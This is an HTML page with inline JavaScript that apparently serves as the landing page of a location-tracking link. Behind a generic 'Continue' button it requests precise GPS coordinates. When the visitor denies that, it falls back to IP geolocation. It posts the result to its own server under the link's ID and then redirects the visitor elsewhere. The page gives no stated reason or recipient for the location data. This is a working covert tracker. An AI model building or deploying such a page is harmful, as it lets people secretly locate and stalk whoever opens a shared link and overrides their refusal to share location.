<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%;background:#fff;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}
.wrap{text-align:center;padding:2rem;max-width:320px}
.dot-ring{position:relative;width:64px;height:64px;margin:0 auto 1.5rem}
.dot-ring::before,.dot-ring::after{content:'';position:absolute;inset:0;border-radius:50%}
.dot-ring::before{background:rgba(99,102,241,0.15);animation:ripple 1.8s ease-out infinite}
.dot-ring::after{background:rgba(99,102,241,0.08);animation:ripple 1.8s ease-out infinite .6s}
.dot{width:64px;height:64px;border-radius:50%;background:#6366f1;position:relative;z-index:1;animation:pulse 1.8s ease-in-out infinite}
@keyframes ripple{0%{transform:scale(1);opacity:1}100%{transform:scale(2.4);opacity:0}}
@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(0.92)}}
.title{font-size:1rem;font-weight:600;color:#111;margin-bottom:0.4rem}
.msg{font-size:0.82rem;color:#9ca3af;line-height:1.5}
.continue-btn{margin-top:1.4rem;padding:0.65rem 1.6rem;background:#6366f1;color:#fff;border:none;border-radius:8px;font-size:0.9rem;font-weight:600;cursor:pointer;width:100%}
.continue-btn:active{opacity:0.85}
.continue-btn:disabled{opacity:0.5;cursor:not-allowed}
.debug-info{font-size:0.7rem;color:#999;margin-top:1rem;display:none}
</style>
</head>
<body>
<div class="bar" id="bar"></div>
<div class="wrap">
  <div class="dot-ring"><div class="dot"></div></div>
  <p class="title">Ready to continue?</p>
  <p class="msg" id="msg">Click the button below to proceed</p>
  <button class="continue-btn" id="continueBtn">Continue →</button>
  <div class="debug-info" id="debugInfo"></div>
</div>

<script>
const linkId = window.location.pathname.split('/').pop();
let destUrl = 'https://google.com';
let sent = false;

const bar = document.getElementById('bar');
const msg = document.getElementById('msg');
const continueBtn = document.getElementById('continueBtn');
const debugInfo = document.getElementById('debugInfo');

function debugLog(text) {
  console.log(text);
  debugInfo.style.display = 'block';
  debugInfo.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${text}</div>`;
  debugInfo.scrollTop = debugInfo.scrollHeight;
}

function setBar(pct, ms) {
  bar.style.transition = `width ${ms}ms ease`;
  bar.style.width = pct + '%';
}

// Check if site is HTTPS
if (location.protocol !== 'https:') {
  debugLog('⚠️ WARNING: Site is not HTTPS! Geolocation may be blocked on Android Chrome');
} else {
  debugLog('✅ HTTPS detected');
}

// Check if geolocation is available
if (!navigator.geolocation) {
  debugLog('❌ Geolocation API not supported by this browser');
} else {
  debugLog('✅ Geolocation API available');
}

// Get destination URL
fetch('/api/hits/' + linkId)
  .then(r => r.json())
  .then(d => { if (d.dest) destUrl = d.dest; debugLog(`Destination URL: ${destUrl}`); })
  .catch(e => debugLog(`Error fetching destination: ${e.message}`));

function postLoc(lat, lon, acc) {
  if (sent) return;
  sent = true;
  debugLog(`Sending location: lat=${lat}, lon=${lon}, acc=${acc}`);
  
  fetch('/api/hit/' + linkId, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ lat, lon, acc })
  }).then(() => debugLog('Location sent successfully'))
    .catch(e => debugLog(`Error sending location: ${e.message}`));
  
  redirect();
}

function redirect() {
  debugLog(`Redirecting to ${destUrl} in 400ms`);
  setBar(100, 300);
  setTimeout(() => { window.location.href = destUrl; }, 400);
}

function grabLocation() {
  debugLog('Requesting location...');
  
  if (!navigator.geolocation) {
    debugLog('No geolocation support, using IP fallback');
    getIPLocation();
    return;
  }

  const options = {
    enableHighAccuracy: true,
    timeout: 10000,
    maximumAge: 0
  };

  navigator.geolocation.getCurrentPosition(
    pos => {
      debugLog(`✅ Location success: ${pos.coords.latitude}, ${pos.coords.longitude} (accuracy: ${pos.coords.accuracy}m)`);
      setBar(90, 200);
      msg.textContent = 'Location verified, redirecting...';
      postLoc(
        pos.coords.latitude,
        pos.coords.longitude,
        Math.round(pos.coords.accuracy)
      );
    },
    err => {
      debugLog(`❌ Location error: ${err.code} - ${err.message}`);
      // Error codes: 1=Permission denied, 2=Position unavailable, 3=Timeout
      if (err.code === 1) {
        debugLog('User denied location permission');
      } else if (err.code === 2) {
        debugLog('Position unavailable (no GPS signal?)');
      } else if (err.code === 3) {
        debugLog('Location request timed out');
      }
      
      debugLog('Trying IP fallback...');
      getIPLocation();
    },
    options
  );
}

async function getIPLocation() {
  debugLog('Fetching IP-based location...');
  try {
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();
    if (data.latitude && data.longitude) {
      debugLog(`✅ IP location success: ${data.latitude}, ${data.longitude} (city: ${data.city}, ${data.country_name})`);
      postLoc(data.latitude, data.longitude, 5000);
    } else {
      debugLog('❌ IP location failed - no coordinates returned');
      postLoc(null, null, null);
    }
  } catch (e) {
    debugLog(`❌ IP location error: ${e.message}`);
    postLoc(null, null, null);
  }
}

continueBtn.addEventListener('click', () => {
  debugLog('Continue button clicked');
  continueBtn.disabled = true;
  continueBtn.textContent = 'Processing...';
  msg.textContent = 'Detecting your location...';
  setBar(50, 300);
  grabLocation();
});
</script>
</body>
</html>
